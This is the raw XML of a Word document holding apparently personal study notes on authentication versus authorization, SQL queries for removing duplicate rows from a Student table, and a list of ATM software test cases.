        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Authentication is about who somebody is.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="00C62690" w:rsidP="000A3836">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r w:rsidR="000A3836" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="222426"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is about what they're allowed to do.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="000A3836" w:rsidP="000A3836">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>Authentication</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t xml:space="preserve"> deals with </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>user account validation</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>. Is this a valid user? Is this user registered in our application</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>?.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t xml:space="preserve"> e.g.: Login</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="000A3836" w:rsidP="000A3836">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222426"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000A3836" w:rsidRPr="00584E67" w:rsidRDefault="000A3836" w:rsidP="000A3836">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t xml:space="preserve"> deals with </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>user access validation to certain feature</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t xml:space="preserve">. Does this user have </w:t>
      </w:r>
      <w:r w:rsidR="00F509D9" w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
        <w:t>/rights to do this? e.g.: Claims, Roles</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="000A3836">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="342" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222426"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="006C590F">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Using authentication, authorization, and encryption</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="006C590F">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>Authentication, authorization, and encryption are used in everyday life. One example in which authorization, authentication, and encryption are all used is booking and taking an airpline flight.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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Encryption is used when a person buys their ticket online at one of the many sites that advertises cheap ticket. Upon finding the perfect flight at an ideal price, a person goes to buy the ticket. Encryption is used to protect a person’s credit card and personal information when it is sent over the Internet to the airline. The company encrypts the customer’s data so that it will be safer from interception in transit.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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 xml:space="preserve">Authentication is used when a </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>traveler shows his or her ticket and driver’s license</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t xml:space="preserve"> at the airport so he or she can check his or her bags </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t xml:space="preserve">and receive a boarding pass. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t xml:space="preserve">Airports need to authenticate that the person is who he or she says she is and has purchased a ticket, before giving him or </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>her a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t xml:space="preserve"> boarding pass.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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 xml:space="preserve">Authorization is used when a person </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>shows his or her boarding pass to the flight attendant so he or she can board the specific plane he or she is supposed to be flying on.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t xml:space="preserve"> A flight attendant must authorize a person so that person can then see the inside of the plane and use the resources the plane has to fly from one place to the next.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="006C590F">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>Here are a few examples of where encryption, authentication, and authorization are used by computers:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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Encryption should be used whenever people are giving out personal information to register for something or buy a product. Doing so ensures the person’s privacy during the communication. Encryption is also often used when the data returned by the server to the client should be protected, such as a financial statement or test results.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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Authentication should be used whenever you want to know exactly who is using or viewing you site. Weblogin is Boston University’s primary method of authentication. Other commercial websites such as Amazon.com require people to login before buying products so they know exactly who their purchasers are.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRPr="00584E67" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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lastRenderedPageBreak/>
        <w:t>Authorization should be used whenever you want to control viewer access of certain pages. For example, Boston University students are not authorized to view certain web pages dedicated to professors and administration. The authorization requirements for a site are typically defined in a website’s .htaccess file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C590F" w:rsidRDefault="006C590F" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="240"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
        <w:t>Authentication and Authorization are often used together. For example, students at Boston University are required to authenticate before accessing the Student Link. The authentication they provide determines what data they are authorized to see. The authorization step prevents students from seeing data of other students.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="4A5458"/>
        </w:rPr>
      </w:pP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delete</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> from Student where Id NOT IN(select MIN(Id) from Student group by name having count(*)&gt;1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> into Student(Id, name) values(1, '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>deepak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>');</w:t>
      </w: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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> into Student(Id, name) values(2, 'd');</w:t>
      </w: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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> into Student(Id, name) values(3, 'd');</w:t>
      </w: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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> into Student(Id, name) values(4, 'deep');</w:t>
      </w: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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> into Student(Id, name) values(5, 'deep');</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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select</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> * from Student;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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delete</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> from Student where Id  IN(select (name) from Student group by name having count(name)&gt;1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> name from Student group by name having count(name)&gt;1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="4750" w:type="pct"/>
        <w:jc w:val="center"/>
        <w:tblCellSpacing w:w="15" w:type="dxa"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0D3E2"/>
        <w:tblCellMar>
          <w:top w:w="30" w:type="dxa"/>
          <w:left w:w="30" w:type="dxa"/>
          <w:bottom w:w="30" w:type="dxa"/>
          <w:right w:w="30" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9006"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidTr="00BC3F7A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C0D3E2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:before="150" w:after="0" w:line="300" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000080"/>
              </w:rPr>
              <w:t>Test Case – 1: Test Case for ATM</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:before="150" w:after="0" w:line="300"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1) Insertion of ATM card with success.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2) Incorrect ATM Card Insertion – Leading to unsuccessful operation.</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3) ATM Card of an invalid account – Leading to unsuccessful operation.</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4) Successful feeding of ATM PIN Number.</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lastRenderedPageBreak/>
              <w:br/>
              <w:t>5) Incorrect ATM PIN Number feeding 3 times - Leading to unsuccessful operation.</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6) Selection of language of operation, with success.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7) Selection of Type of Bank Account with success.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8) Incorrect Bank Account type Selection in respect to the type of ATM Card inserted - Leading to unsuccessful operation.</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9) Selection of withdrawal option with success.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10) Selection of Amount to be withdrawn with success.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11) Incorrect Currency denominations - Leading to unsuccessful operation.</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12) Successful completion of withdrawal of money.</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13) Amount to be withdrawn in excess of the available Balance - Leading</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidTr="00BC3F7A">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C0D3E2"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>to</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
              <w:t xml:space="preserve">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14) Shortage of Currency Notes in ATM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15) Amount to be withdrawn in excess of the daily withdrawal limit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16) ATM link to the Bank Server not available at the moment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17) Clicking of the Cancel button after inserting the ATM card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18) Clicking of the Cancel button after feeding the ATM PIN Number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19) Clicking of the Cancel button after selection of language of operation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20) Clicking of the Cancel button after selection of Type of Bank Account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21) Clicking of the Cancel button after selection of Amount of withdrawal - Leading to unsuccessful operation.</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
              <w:br/>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
              <w:br/>
              <w:t>22) Clicking of the Cancel button after feeding the amount to be withdrawn - Leading to unsuccessful operation.</w:t>
            </w:r>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="666666"/>
              </w:rPr>
              <w:br/>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
              <w:spacing w:before="150" w:after="0" w:line="300" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00584E67">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="333333"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Test Case – 2: Test Case for a Cell Phone</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00BC3F7A">
            <w:pPr>
